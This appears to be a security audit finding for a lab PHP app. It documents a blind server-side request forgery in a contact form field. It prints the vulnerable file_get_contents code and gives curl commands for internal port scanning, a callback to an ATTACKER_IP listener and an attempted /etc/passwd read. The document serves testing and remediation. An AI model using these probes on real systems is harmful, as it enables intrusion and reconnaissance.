# 14 — Server-side request forgery in the contact form (blind)

- **OWASP Top 10 (2021):** A10:2021 – SSRF
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/contact.php:7-9` — `POST /contact.php`, field `webpage`
(unauthenticated):

```php
$web = isset($_POST['webpage']) ? $_POST['webpage'] : '';
if ($web != '') {
    $c = @file_get_contents($web);
}
```

## How it works (root cause)

The "which webpage are you contacting us from?" field is fetched
server-side with `file_get_contents()` and no validation. The result `$c`
is discarded (blind SSRF), but the *request itself* is made by the web
server, and with `allow_url_fopen=On` any wrapper is accepted.

## Exploitation steps

1. Blind internal port scan — watch for timing / behaviour differences:

   ```bash
   for port in 21 22 3307 8080; do
     start=$(date +%s%N)
     curl -s -o /dev/null --max-time 5 -d "webpage=http://127.0.0.1:$port/" \
          http://localhost:8080/contact.php
     end=$(date +%s%N)
     echo "port $port: $(( (end-start)/1000000 )) ms"
   done
   ```

   Open ports (e.g. MySQL `3307`, the app `8080`) respond quickly; closed
   ports hang until timeout.

2. Confirm the server is making the request (evidence from a listener):

   ```bash
   # attacker listener on a second host
   ncat -lkvv 4444
   curl -s -d "webpage=http://ATTACKER_IP:4444/ping" http://localhost:8080/contact.php
   # listener logs an incoming connection from the web server
   ```

3. Local-file read (blind — no output, but the fetch is attempted):

   ```bash
   curl -s -d "webpage=file:///etc/passwd" http://localhost:8080/contact.php
   ```

## Working PoC (verified)

A listener on the attacker host logged an incoming `GET /ping` from the web
server after the POST — confirming the web server initiated the outbound
request. Timing probes distinguished open from closed internal ports
(3307 and 8080 fast, closed ports ~5s timeout).

## Expected result / verification

- Outbound request from the web server observed by the attacker's listener.
- Timing oracle reveals which internal ports are open.

## Attack chain

```
blind SSRF
  → internal port scan / service discovery
  → reach services not exposed to the internet (MySQL 3307, php-fpm, metadata)
  → combine with 13 (non-blind, file://) for actual data exfiltration
```

## Notes

- This is the "blind" counterpart of 13: the fetched content is not
  returned, so the direct impact is reconnaissance + triggering internal
  requests, not data read. 13 is used when the attacker needs the bytes.
